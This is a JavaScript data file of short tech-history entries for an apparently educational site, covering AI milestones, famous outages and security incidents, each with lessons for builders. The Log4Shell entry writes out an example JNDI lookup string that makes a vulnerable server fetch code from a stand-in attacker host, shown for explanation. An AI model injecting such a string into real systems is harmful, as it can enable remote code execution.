// Stories & Turning Points: moments that explain why things are the way they are.

import { AREA, doc, entry } from './helpers.js';

const { STORIES } = AREA;

export const STORY_ENTRIES = [
  entry('turing-1950', 'example', STORIES, 'curious', 'Turing’s Imitation Game (1950)', {
    summary: '“Can machines think?” Alan Turing swapped the question for a test: can a machine hold a conversation you can’t tell from a person’s? Seventy years later, chatbots made it practical.',
    aliases: ['Turing test', 'imitation game', 'Alan Turing'],
    tags: ['history', 'ai'],
    year: 1950,
    body: doc`
      In "Computing Machinery and Intelligence" (1950), Turing argued that "can machines think?" was too vague to answer, and proposed a game instead: an interrogator chats by text with a human and a machine and tries to tell which is which.

      He predicted that by around 2000, machines would fool an average interrogator 30% of the time after five minutes. He also anticipated objections still heard today — "it's just following rules", "it can't be creative", "it has no feelings" — and answered them in the same paper. He even suggested building a "child machine" and *teaching* it, rather than programming adult intelligence directly: learning from examples, decades early.

      ## Why it matters now
      Modern LLMs pass casual versions of the test easily, which mostly revealed that fooling people in conversation is a weaker bar than it seemed — fluency isn't reliability. The field now leans on evals: specific tasks with checkable answers. The shift from "does it seem intelligent?" to "does it get this right, how often?" is the same shift you'll make evaluating your own LLM features.
    `,
  }),

  entry('dartmouth-1956', 'example', STORIES, 'curious', 'The Dartmouth Workshop (1956)', {
    summary: 'A summer workshop that named the field “artificial intelligence” and expected major progress in two months. The optimism — and the underestimate — set a pattern.',
    aliases: ['Dartmouth workshop', 'artificial intelligence', 'John McCarthy'],
    tags: ['history', 'ai'],
    year: 1956,
    body: doc`
      John McCarthy, Marvin Minsky, Claude Shannon and Nathaniel Rochester proposed "a 2 month, 10 man study of artificial intelligence" for the summer of 1956 at Dartmouth College. The proposal coined the term, and conjectured that every aspect of learning and intelligence could in principle be described precisely enough for a machine to simulate it.

      They thought a significant advance on language, abstraction and self-improvement could be made that summer. It took about sixty years for language, and the method that worked — learning statistical patterns from vast data — was not the hand-written logic most of them expected.

      ## The pattern
      Early AI swung between hype and disappointment (the AI winters). The lesson isn't that predictions are always wrong; it's that the *route* is hard to foresee. The Bitter Lesson is one attempt to learn from that history.
    `,
  }),

  entry('perceptron-1958', 'example', STORIES, 'curious', 'The Perceptron (1958)', {
    summary: 'Frank Rosenblatt’s learning machine — a single artificial neuron that adjusted its weights from examples. Hailed as the embryo of a thinking computer, then famously cut down.',
    aliases: ['perceptron', 'Rosenblatt', 'Minsky and Papert', 'XOR problem'],
    tags: ['history', 'ai'],
    year: 1958,
    body: doc`
      Rosenblatt's perceptron took inputs (pixels from a 20×20 camera), multiplied them by weights, summed, and fired if the total passed a threshold. When it got an example wrong, it nudged the weights towards the right answer. It learned to tell simple shapes apart. Newspapers reported the Navy expected it to walk, talk, see and be conscious of its existence.

      In 1969 Minsky and Papert's book *Perceptrons* proved that a single-layer perceptron can't learn some simple functions — famously XOR (true when exactly one input is true), because no single straight line separates the cases. The fix — multiple layers with nonlinear activations — was known in principle, but nobody had a good way to train them. Funding and interest collapsed.

      ## The long echo
      The perceptron is one neuron of every modern network: a dot product plus a bias, then a nonlinearity. Backpropagation (popularised 1986) solved the training problem for many layers; GPUs and data (2012) made it practical. Rosenblatt died in 1971, long before the vindication.
    `,
  }),

  entry('ai-winters', 'concept', STORIES, 'curious', 'AI Winters', {
    summary: 'Twice — mid-1970s and late 1980s — AI promised too much, delivered too little, and funding froze. A reminder that hype cycles are real, and so is eventual progress.',
    aliases: ['AI winter', 'AI winters', 'expert systems', 'hype cycle', 'Lighthill report'],
    tags: ['history', 'ai'],
    year: 1974,
    body: doc`
      ## The first winter (~1974–1980)
      Machine translation had been promised within years in the 1950s; by 1966 a US report (ALPAC) concluded it was slower, costlier and worse than human translation. In Britain, the 1973 Lighthill report judged AI's grand aims unmet. Perceptrons had been deflated. Funding dried up.

      ## The second (~1987–1993)
      **Expert systems** — thousands of hand-written if-then rules from human experts — boomed in the early 1980s, with specialised Lisp machines to run them. They were brittle outside their narrow rules, expensive to maintain, and the hardware market collapsed when ordinary workstations caught up.

      ## What changed
      Each revival came from a different approach, not a better version of the last: statistics and machine learning in the 1990s–2000s, deep learning from 2012, large language models from 2018.

      ## Lessons for building now
      - Demos generalise worse than they look. Evaluate on real inputs.
      - Hand-written rules are brittle; learned systems are fuzzy. Good products combine both.
      - Enthusiasm is not a roadmap — but dismissing a field after a hype peak has also been wrong, repeatedly.
    `,
  }),

  entry('postgres-origins', 'example', STORIES, 'curious', 'From Ingres to Postgres (1986)', {
    summary: 'Michael Stonebraker’s Berkeley project “post-Ingres” set out to make databases extensible. Thirty-plus years of open-source work later, it’s the database most new projects pick.',
    aliases: ['POSTGRES project', 'Ingres', 'Michael Stonebraker', 'Postgres95'],
    tags: ['history', 'databases'],
    year: 1986,
    body: doc`
      Ingres, built at Berkeley in the 1970s, was one of the first relational databases. In 1986 Stonebraker started its successor, POSTGRES ("post-Ingres"), with a then-radical aim: let users add their own **data types, operators and index methods** instead of living with a fixed set.

      It originally spoke its own query language, POSTQUEL. In 1994–95 two students, Andrew Yu and Jolly Chen, swapped in SQL and released "Postgres95"; in 1996 it became **PostgreSQL** and passed to a global volunteer community, which has shipped a major release every year since. Stonebraker won the Turing Award in 2014.

      ## Why the origin still matters
      That extensibility is why Postgres can grow new abilities without forking: PostGIS for maps, full-text search, JSONB — and **pgvector**, which let embeddings live next to your ordinary rows when the AI wave arrived. A design decision from 1986 is why your RAG app may not need a separate vector database.
    `,
  }),

  entry('web-invented-1989', 'example', STORIES, 'curious', 'Tim Berners-Lee Proposes the Web (1989)', {
    summary: 'A software engineer at CERN wanted researchers to share linked documents across different computers. His boss wrote “vague but exciting” on the proposal. URLs, HTTP and HTML followed.',
    aliases: ['World Wide Web', 'Tim Berners-Lee', 'CERN', 'first website'],
    tags: ['history', 'web'],
    year: 1989,
    body: doc`
      In March 1989 Tim Berners-Lee, a software engineer at CERN (the particle physics lab near Geneva), wrote "Information Management: A Proposal" — a way to link documents across the lab's incompatible computers. His supervisor, Mike Sendall, scribbled "vague but exciting…" on the cover and let him pursue it.

      By the end of 1990 he had written the three pieces that still define the web: **URLs** to name any document, **HTTP** to fetch it, **HTML** to write it with links — plus the first browser/editor and the first web server, on a NeXT computer. The first website, explaining the project, went public in 1991. In 1993 CERN put the web software in the public domain, royalty-free — arguably the decision that let it win.

      ## What survived
      Every request your React app makes to Flask is a direct descendant: a method, a URL, headers, a body. The stateless design (each request stands alone) is why cookies and sessions had to be invented, and why the web scaled to billions of users.
    `,
  }),

  entry('javascript-1995', 'example', STORIES, 'curious', 'JavaScript in Ten Days (1995)', {
    summary: 'Brendan Eich built the first version of JavaScript at Netscape in about ten days in May 1995. Its rushed quirks are still with us; so is its ubiquity.',
    aliases: ['Brendan Eich', 'Netscape', 'LiveScript', 'JavaScript history'],
    tags: ['history', 'web'],
    year: 1995,
    body: doc`
      Netscape wanted a scripting language for web pages — something "that looked like Java" (for marketing) but was easy for amateurs. Brendan Eich wrote the prototype in roughly ten days. Called Mocha, then LiveScript, it shipped as **JavaScript** in December 1995, the name a marketing tie-in with Sun's Java, to which it's barely related.

      Some decisions made in that sprint are permanent, because changing them would break the web:
      - §typeof null === "object"§ — a bug in the first implementation, kept for compatibility.
      - §==§ with its surprising type coercions (hence §===§).
      - Automatic semicolon insertion.

      It was standardised as ECMAScript in 1997. Then came AJAX (2005: pages updating without reloading), fast engines (Chrome's V8, 2008), Node.js (2009: JavaScript on servers), and React (2013). Since 2015 the language has improved yearly — §let§/§const§, arrow functions, classes, modules, §async§/§await§ — and TypeScript layered types on top.

      The lesson: the thing that ships and spreads beats the thing that's perfect, and then you live with its first draft forever.
    `,
  }),

  entry('git-2005', 'example', STORIES, 'curious', 'Linus Writes Git (2005)', {
    summary: 'When the Linux kernel lost free use of its version-control tool, Linus Torvalds wrote a replacement. Git was hosting its own code within days.',
    aliases: ['Linus Torvalds', 'BitKeeper', 'history of Git'],
    tags: ['history', 'tools'],
    year: 2005,
    body: doc`
      From 2002 the Linux kernel used BitKeeper, a proprietary distributed version-control system, under a free licence. In April 2005 that arrangement collapsed after a dispute over reverse-engineering. Torvalds needed a replacement that could handle thousands of contributors and be *fast*.

      He started Git on 3 April 2005; it was managing its own source within days, and the kernel moved to it that June. Design choices came straight from the kernel's needs: every copy is a full repository (distributed), content is addressed by its hash (tamper-evident), and branching and merging are cheap because they happen constantly.

      Junio Hamano took over maintenance months later and still leads it. GitHub (2008) wrapped Git in pull requests and a social layer, and Git became the default for nearly all software.

      ## Why it feels the way it does
      Git was designed by and for kernel developers, which explains both its power and its famously unfriendly commands. The underlying model — snapshots named by hashes, branches as movable labels — is simpler than the commands suggest; learn the model and the commands make sense.
    `,
  }),

  entry('knight-capital-2012', 'example', STORIES, 'curious', 'Knight Capital’s 45-Minute Meltdown (2012)', {
    summary: 'A deployment reached 7 of 8 servers; a reused feature flag woke up dead code on the eighth. In 45 minutes an automated trading firm lost about 440 million dollars.',
    aliases: ['Knight Capital', 'Power Peg', 'deployment disaster'],
    tags: ['history', 'deployment', 'failure'],
    year: 2012,
    body: doc`
      On 1 August 2012, Knight Capital — then one of the largest US stock traders — deployed new code for a new exchange programme. A technician copied it to seven of the eight production servers; the eighth kept the old code.

      The new release reused a configuration flag that, years earlier, had controlled an obsolete routine called "Power Peg", still sitting unused in the old code. On the eighth server, turning the flag on revived Power Peg, which began firing millions of orders into the market. There was no automated kill switch, and staff initially rolled back the *new* code on the healthy servers — making things worse. In 45 minutes Knight accumulated billions in unwanted positions and lost about \$440 million. It needed a rescue and was acquired within months.

      ## The lessons, all ordinary
      - **Automate deployments** so every server gets the same thing — and verify it did.
      - **Delete dead code**; don't repurpose old flags.
      - **Kill switches and limits** on anything that can spend money automatically — true of trading bots and of LLM agents with API budgets.
      - **Monitor and alert** on abnormal behaviour; practise the rollback.
    `,
  }),

  entry('heartbleed-2014', 'example', STORIES, 'curious', 'Heartbleed (2014)', {
    summary: 'A missing bounds check in OpenSSL let anyone read chunks of a server’s memory — keys, passwords, cookies. It exposed how much of the internet rested on a few unpaid volunteers.',
    aliases: ['Heartbleed', 'OpenSSL', 'buffer over-read'],
    tags: ['history', 'security'],
    year: 2014,
    body: doc`
      TLS has a "heartbeat" feature: the client sends a message and its length; the server echoes it back. OpenSSL's code trusted the stated length. Send one byte but claim 64 KB, and the server replied with your byte plus ~64 KB of whatever sat next to it in memory — possibly private keys, session cookies, passwords. Repeat as often as you like; no trace in logs.

      The bug was introduced in 2012 and disclosed in April 2014. Estimates at the time put roughly half a million trusted HTTPS servers at risk. Fixing it meant patching, then **revoking and reissuing certificates** and resetting passwords, because anything might have leaked.

      ## The bigger story
      OpenSSL, securing a huge share of the web, was maintained by a handful of people with donations of around \$2,000 a year. The shock produced funding for critical open-source infrastructure — and a question that came back with left-pad and the xz backdoor: who maintains the code everyone depends on?

      ## For your code
      Never trust a length, size or index supplied by a client. Validate input sizes — it's the same principle as capping request bodies and token counts.
    `,
  }),

  entry('left-pad-2016', 'example', STORIES, 'curious', 'left-pad (2016)', {
    summary: 'A developer unpublished an 11-line npm package after a dispute, and builds across the JavaScript world broke — including React’s. A lesson in how deep dependency trees go.',
    aliases: ['left-pad', 'unpublish', 'dependency hell', 'supply chain'],
    tags: ['history', 'dependencies'],
    year: 2016,
    body: doc`
      In March 2016, after a naming dispute with a company over another of his packages, developer Azer Koçulu unpublished all 273 of his npm packages. One was **left-pad** — eleven lines that pad a string with spaces on the left. Thousands of projects depended on it, mostly without knowing, through dependencies of dependencies — including Babel and React's toolchain. Builds everywhere failed with "module not found".

      npm took the unusual step of restoring the package, and changed its rules: packages more than 72 hours old, with dependents, can no longer simply be unpublished.

      ## What it showed
      - A modern app installs hundreds or thousands of packages; each is someone you trust implicitly.
      - Tiny packages are convenient and add risk out of proportion to their size.

      ## Habits that followed
      Lockfiles committed and used in CI (§npm ci§), fewer trivial dependencies, private mirrors in companies, and a new appreciation that "supply chain" is a security term — which the xz backdoor made painfully concrete.
    `,
  }),

  entry('gitlab-2017', 'example', STORIES, 'curious', 'GitLab Deletes Its Database (2017)', {
    summary: 'A tired engineer ran a delete on the wrong database server. Then the team found that five backup methods weren’t working. They live-streamed the recovery.',
    aliases: ['GitLab outage', 'GitLab database incident'],
    tags: ['history', 'databases', 'failure'],
    year: 2017,
    body: doc`
      On 31 January 2017, GitLab.com's database replication was lagging under a spam attack. Late at night, an engineer trying to reset the replica ran a command to remove its data directory — on the **primary** by mistake. He stopped it after a second or two; about 300 GB was already gone.

      Then the recovery: regular database dumps had been silently failing (a version mismatch; the failure emails were being rejected). Disk snapshots weren't enabled for the database servers. Other backup routes were missing or broken too. What saved them was a copy an engineer had taken by hand six hours earlier for unrelated testing. About six hours of issues, merge requests and comments were lost.

      GitLab documented everything publicly and even live-streamed the restore — an unusually honest post-mortem that became required reading.

      ## The lessons
      - **A backup isn't real until you've restored it.** Test restores on a schedule.
      - Make the dangerous server look different (prompt colour, hostname) — humans at 11 pm mistake one terminal for another.
      - Alerts about failing backups must reach someone who acts.
      - Blameless post-mortems: the system allowed the mistake; fix the system.
    `,
  }),

  entry('log4shell-2021', 'example', STORIES, 'curious', 'Log4Shell (2021)', {
    summary: 'A Java logging library would fetch and run code named inside a logged string. Type the magic text into any field that got logged and you could take over the server.',
    aliases: ['Log4Shell', 'Log4j'],
    tags: ['history', 'security'],
    year: 2021,
    body: doc`
      Log4j, a near-universal Java logging library, supported "lookups": text like §\${env:USER}§ inside a log message was expanded when logged. One lookup type, JNDI, could fetch an object from a remote server — and load it as code.

      So an attacker put §\${jndi:ldap://attacker.example/a}§ anywhere an application might log it: a username, a search box, a chat message, the User-Agent header. The server logged it, Log4j dutifully fetched the attacker's code and ran it. Disclosed in December 2021, it scored the maximum 10.0 severity, affected everything from cloud services to Minecraft servers, and had been in the library since 2013.

      ## Why it's a lesson for LLM apps too
      Log4Shell is the purest example of **data being treated as instructions**. SQL injection, XSS and now prompt injection are the same mistake in different places: untrusted text crossing into a component that interprets it.

      ## Practical habits
      Know your dependencies (and their dependencies), have a way to patch fast, and be suspicious of any feature that evaluates or fetches based on content it's handed.
    `,
  }),

  entry('xz-backdoor-2024', 'example', STORIES, 'curious', 'The xz Backdoor (2024)', {
    summary: 'Over two years, a patient contributor earned maintainer trust on a compression library, then slipped in a hidden backdoor aimed at SSH. A Microsoft engineer noticed a half-second slowdown.',
    aliases: ['xz backdoor', 'xz utils', 'Jia Tan', 'supply-chain attack'],
    tags: ['history', 'security', 'dependencies'],
    year: 2024,
    body: doc`
      xz/liblzma is a small compression library present on nearly every Linux system. From 2021, an account named "Jia Tan" contributed helpful patches. Other accounts (apparently sock puppets) pressured the exhausted sole maintainer to accept help; Jia Tan became a co-maintainer.

      In early 2024, releases 5.6.0 and 5.6.1 carried a backdoor hidden in binary test files and build scripts — not in the visible source. On some Linux distributions, it would have let the holder of a specific private key run commands on any affected machine through SSH.

      On 29 March 2024, Andres Freund, a Microsoft engineer working on Postgres, noticed SSH logins using more CPU and taking about half a second longer than they should in a test system. He dug in, found the backdoor, and reported it. It had reached only testing and rolling-release distributions — weeks before it would have landed in stable releases of major ones.

      ## Lessons
      - Supply-chain attacks can be social, slow and patient.
      - Overworked solo maintainers of critical code are a security risk to everyone.
      - Performance anomalies are worth investigating: curiosity about a 500 ms delay caught what reviews didn't.
      - Pin dependencies, update deliberately, and prefer widely-scrutinised packages.
    `,
  }),

  entry('crowdstrike-2024', 'example', STORIES, 'curious', 'The CrowdStrike Outage (2024)', {
    summary: 'A faulty content update to a security product crashed about 8.5 million Windows machines at once, grounding flights and disrupting hospitals. The fix required hands on each machine.',
    aliases: ['CrowdStrike', 'CrowdStrike outage', 'staged rollout', 'canary release'],
    tags: ['history', 'deployment', 'failure'],
    year: 2024,
    body: doc`
      On 19 July 2024, CrowdStrike pushed a routine configuration ("channel file") update to its Falcon security sensor, which runs inside the Windows kernel. The file triggered an out-of-bounds memory read; the kernel crashed; machines blue-screened, rebooted, loaded the file again, and crashed again. Microsoft estimated about 8.5 million devices were hit — airlines, banks, broadcasters, hospitals, including many in India.

      The update was pulled within about 80 minutes, but crashed machines couldn't receive the fix: they had to be booted into safe mode and the file deleted by hand, sometimes with encryption recovery keys, one machine at a time.

      ## Lessons for any deploy
      - **Staged (canary) rollouts**: ship to 1%, watch, then 10%, then everyone. Configuration is code and deserves the same caution.
      - **Validate inputs even from yourself**: the component trusted a file it received.
      - **Blast radius**: the more privileged and widespread a component, the more careful its updates must be.
      - **Recovery paths** that don't depend on the broken thing working.

      The same logic applies when you change a prompt or swap a model in production: roll out gradually, watch the metrics and evals, keep the old version one click away.
    `,
  }),

  entry('alexnet-2012', 'example', STORIES, 'curious', 'AlexNet and ImageNet (2012)', {
    summary: 'A neural network trained on two gaming GPUs crushed the ImageNet image-recognition contest. Deep learning went from fringe to mainstream almost overnight.',
    aliases: ['AlexNet', 'ImageNet', 'Fei-Fei Li', 'deep learning revolution'],
    tags: ['history', 'ai'],
    year: 2012,
    body: doc`
      ## The dataset
      Fei-Fei Li bet that data, not cleverer algorithms, was the bottleneck, and built **ImageNet**: over 14 million images labelled into ~20,000 categories, using crowdsourced workers (2009). From 2010 an annual contest asked models to classify 1,000 categories.

      ## The result
      In 2012, Alex Krizhevsky, Ilya Sutskever and Geoffrey Hinton entered **AlexNet**, a deep convolutional network trained for about a week on two NVIDIA GTX 580 gaming cards. Its top-5 error was 15.3% against 26.2% for the next-best entry — a gap that ended the argument. Key ingredients: ReLU activations, dropout, lots of data, and GPUs.

      ## What followed
      Within a few years nearly every vision system was a deep network; Google, Facebook and others hired the researchers; GPUs became AI hardware; the same recipe spread to speech and then language. Hinton later shared a Turing Award (2018) and a Nobel Prize in Physics (2024). Sutskever co-founded OpenAI.

      The template — a simple, general architecture + much more data + much more compute — is the one scaling laws later made quantitative.
    `,
  }),

  entry('word2vec-2013', 'example', STORIES, 'curious', 'word2vec: King − Man + Woman (2013)', {
    summary: 'A fast way to learn word vectors from text showed that meaning lives in directions: king − man + woman lands near queen. It also showed that vectors learn our biases.',
    aliases: ['word2vec', 'king minus man plus woman', 'word vectors', 'word embeddings'],
    tags: ['history', 'ai', 'vectors'],
    year: 2013,
    body: doc`
      Tomas Mikolov and colleagues at Google trained a shallow network to predict a word from its neighbours (or neighbours from the word) across billions of words. The by-product — a vector per word — was the point. "You shall know a word by the company it keeps" (J. R. Firth, 1957), made computable.

      The surprise was arithmetic: $\vec{\text{king}} - \vec{\text{man}} + \vec{\text{woman}}$ landed closest to $\vec{\text{queen}}$. Paris − France + Italy ≈ Rome. Directions in the space encoded relationships nobody had programmed.

      ## The catch
      In 2016 researchers showed the same arithmetic produced *man : computer programmer :: woman : homemaker*. Embeddings faithfully learn the associations in their training text — including stereotypes. Every embedding and language model since inherits the issue; it's why evaluating outputs for bias is part of shipping responsibly.

      ## The lineage
      word2vec gave one vector per word regardless of context ("bank" of a river = "bank" for money). Transformers produce *contextual* vectors, and sentence-embedding models produce one vector per passage — the embeddings your RAG system searches.
    `,
  }),

  entry('react-2013', 'example', STORIES, 'curious', 'React Is Announced (2013)', {
    summary: 'Facebook open-sourced React at JSConf US in May 2013. The audience disliked HTML inside JavaScript. Within a few years the idea — UI as a function of state — had won.',
    aliases: ['React announcement', 'Jordan Walke', 'JSConf 2013'],
    tags: ['history', 'web'],
    year: 2013,
    body: doc`
      Jordan Walke built React's prototype at Facebook to tame the ads interface, where every data change had to be hand-wired into the DOM. It was open-sourced at JSConf US in May 2013. The reception was cool: mixing HTML-like JSX into JavaScript broke the era's rule of "separation of concerns", and re-rendering whole components sounded wasteful.

      The counter-argument was React's real idea: **describe the UI for the current state, and let the library work out the DOM changes**. That removed a whole class of bugs where the screen and the data disagreed, and the virtual DOM made the re-rendering cheap enough. Instagram and then much of the industry adopted it; React Native (2015) took the model to mobile.

      Later milestones: hooks (2019) replaced class components; server components and the React Compiler (2020s) pushed work to the server and automated memoisation.

      ## The lesson
      The objection ("that's not how we separate things") was about file layout; the benefit was about *correctness*. Judge new tools by which bugs they make impossible.
    `,
  }),

  entry('attention-paper-2017', 'example', STORIES, 'curious', 'Attention Is All You Need (2017)', {
    summary: 'Eight Google researchers dropped recurrence and built a translation model from attention alone. The Transformer trained faster, scored better — and became the basis of every major LLM.',
    aliases: ['Attention Is All You Need', 'Vaswani et al.', 'transformer paper'],
    tags: ['history', 'ai', 'transformers'],
    year: 2017,
    body: doc`
      In 2017, machine translation was dominated by recurrent networks (LSTMs) that read a sentence one word at a time, with attention added to help them look back. Ashish Vaswani and seven co-authors at Google asked: what if attention did everything?

      Their **Transformer** processed all positions in parallel with self-attention, used multiple heads, added positional encodings and residual connections, and set new records on English–German and English–French translation — the big model trained in 3.5 days on eight GPUs, a fraction of rivals' cost.

      The paper — whose title riffs on a Beatles song — became one of the most cited in computer science. Within two years came BERT (2018) and GPT-2 (2019); within five, ChatGPT. Most of the authors went on to found or lead AI companies.

      ## Why it won
      Not only accuracy: parallelism. Recurrent networks couldn't use GPUs efficiently because each step waited for the previous one. Transformers could — and so they could be scaled, which turned out to be what mattered most.
    `,
  }),

  entry('bitter-lesson-2019', 'theory', STORIES, 'curious', 'The Bitter Lesson (2019)', {
    summary: 'Rich Sutton’s short essay: across 70 years of AI, general methods that scale with computation beat approaches built on human knowledge — every time, eventually.',
    aliases: ['Bitter Lesson', 'Rich Sutton', 'general methods that scale'],
    tags: ['history', 'ai', 'theory'],
    year: 2019,
    body: doc`
      Sutton's argument, from chess (search beat hand-crafted chess knowledge), Go, speech recognition and computer vision: researchers repeatedly build in what they know about the domain; it helps in the short term and plateaus; then a general method — search or learning — plus more compute overtakes it. "The bitter lesson" is that our intuitions about how *we* think are a poor guide to building AI.

      Written in March 2019, it read as prophecy after GPT-3 and scaling laws: bigger models, more data, fewer hand-built features.

      ## Using it without overdoing it
      For an app builder, the practical version:
      - Prefer general mechanisms (a capable model + good context + tools) over elaborate hand-coded pipelines that encode today's model weaknesses. Next year's model may not need your workaround.
      - Keep scaffolding thin and replaceable; re-run evals when models improve and delete what's no longer needed.
      - But measure: hand-written rules, SQL and classic ML still win where the problem is crisp, cheap and must be exact.
    `,
  }),

  entry('gpt3-2020', 'example', STORIES, 'curious', 'GPT-3 and In-Context Learning (2020)', {
    summary: 'A 175-billion-parameter model that could do new tasks from a few examples in the prompt — no retraining. Prompting became programming.',
    aliases: ['GPT-3', 'GPT-2', 'in-context learning', 'Language Models are Few-Shot Learners'],
    tags: ['history', 'ai', 'llm'],
    year: 2020,
    body: doc`
      OpenAI's GPT-2 (2019, 1.5B parameters) wrote startlingly fluent paragraphs; its full release was initially withheld over misuse concerns. GPT-3 (May 2020) was over 100× larger — 175 billion parameters trained on about 300 billion tokens.

      The paper's title said what was new: **"Language Models are Few-Shot Learners."** Show GPT-3 a few examples of a task in the prompt — English→French pairs, questions and answers, product descriptions → ad copy — and it continued the pattern for new inputs. No gradient updates, no fine-tuning. The skill emerged with scale and wasn't clearly present in smaller models.

      That made the prompt a programming interface, spawned "prompt engineering", and — via an API rather than downloadable weights — started the business model of renting models by the token.

      ## Its limits foreshadowed today's work
      GPT-3 was a base model: it continued documents rather than following instructions, and confidently invented facts. Instruction tuning and RLHF (InstructGPT, early 2022) fixed the first; RAG and tools address the second.
    `,
  }),

  entry('chatgpt-2022', 'example', STORIES, 'curious', 'ChatGPT (2022)', {
    summary: 'Released on 30 November 2022 as a “research preview”, a chat interface on an RLHF-tuned model became the fastest-growing consumer app of its time — and turned LLMs into everyone’s business.',
    aliases: ['ChatGPT', 'GPT-4', 'GPT-3.5'],
    tags: ['history', 'ai', 'llm'],
    year: 2022,
    body: doc`
      The model behind it wasn't a leap over what OpenAI already had; the difference was the **interface** and the **post-training**. A chat box anyone could use, backed by a model tuned with RLHF to follow instructions, admit mistakes and decline some requests. It reached a million users in five days and an estimated 100 million within about two months.

      What followed, quickly: GPT-4 (March 2023), Anthropic's Claude (March 2023), Google's Bard/Gemini, Meta's LLaMA and a flood of open models, and nearly every software company adding "AI features".

      ## What it taught product builders
      - The same capability can be ignored or explode depending on how accessible it is.
      - Conversation turned out to be a natural interface for a surprisingly wide range of tasks.
      - Users trust fluent answers too much — hallucination went from research topic to public concern.
      - Once people have used a good chat assistant, "type a question, get an answer" becomes the expectation for every tool — probably including your side project.
    `,
  }),

  entry('llama-leak-2023', 'example', STORIES, 'curious', 'LLaMA Leaks, llama.cpp Arrives (2023)', {
    summary: 'Meta shared LLaMA with researchers; within a week the weights were on BitTorrent; within three weeks it ran on laptops and phones. The open-weight local AI movement began.',
    aliases: ['LLaMA leak', 'Alpaca', 'We Have No Moat'],
    tags: ['history', 'ai', 'local'],
    year: 2023,
    body: doc`
      On 24 February 2023, Meta announced LLaMA — models from 7B to 65B parameters, trained only on public data, available to approved researchers. Around 3 March the weights appeared on 4chan and BitTorrent.

      What happened next, in days:
      - **10 March** — Georgi Gerganov released **llama.cpp**, running the 7B model on a MacBook CPU with 4-bit quantisation.
      - **13 March** — Stanford's **Alpaca**: LLaMA 7B fine-tuned on 52,000 instructions generated by OpenAI's model, for a few hundred dollars, behaving surprisingly like ChatGPT.
      - Soon after: people running models on phones and Raspberry Pis, LoRA fine-tunes shared as small files, Vicuna and dozens of variants.

      In May, a leaked internal Google memo titled "We Have No Moat, And Neither Does OpenAI" argued open-source iteration speed would erode the big labs' advantage. That July Meta embraced it, releasing Llama 2 openly for commercial use; Mistral, Qwen, Gemma, DeepSeek and others followed.

      ## Why it matters to you
      Ollama, GGUF files, quantised models on your laptop, and a healthy ecosystem of free open-weight models all trace back to those few weeks.
    `,
  }),

  entry('deepseek-r1-2025', 'example', STORIES, 'curious', 'DeepSeek-R1 (2025)', {
    summary: 'A Chinese lab released an open-weight reasoning model rivalling the best closed ones, trained largely with plain reinforcement learning, at a reported fraction of the cost. NVIDIA lost about 17% of its value in a day.',
    aliases: ['DeepSeek-R1', 'R1-Zero', 'GRPO'],
    tags: ['history', 'ai', 'training'],
    year: 2025,
    body: doc`
      On 20 January 2025, DeepSeek released **R1**, a reasoning model competitive with OpenAI's o1 on maths and coding benchmarks, with open weights under the MIT licence and a detailed paper. It was built on DeepSeek-V3, a 671B-parameter mixture-of-experts model whose final training run the company said cost under 6 million dollars in GPU time (excluding research and earlier experiments).

      The paper's striking result: **R1-Zero**, trained with reinforcement learning on problems with checkable answers — no human-written reasoning examples — *spontaneously* learned to write long chains of thought, re-check its work and backtrack ("aha moments"). It also released small distilled versions (1.5B–70B, on Qwen and Llama bases) that ran locally.

      Markets took notice: on 27 January NVIDIA's share price fell about 17%, the largest one-day loss of market value in US history at the time, on fears that frontier AI might need far fewer chips.

      ## Takeaways
      - Reasoning can be trained with RL on verifiable rewards — now standard practice.
      - Efficiency innovations (MoE, compressed attention caches, low-precision training) matter as much as raw scale.
      - Open-weight models trail the frontier by months, not years — good news for local AI.
    `,
  }),
];
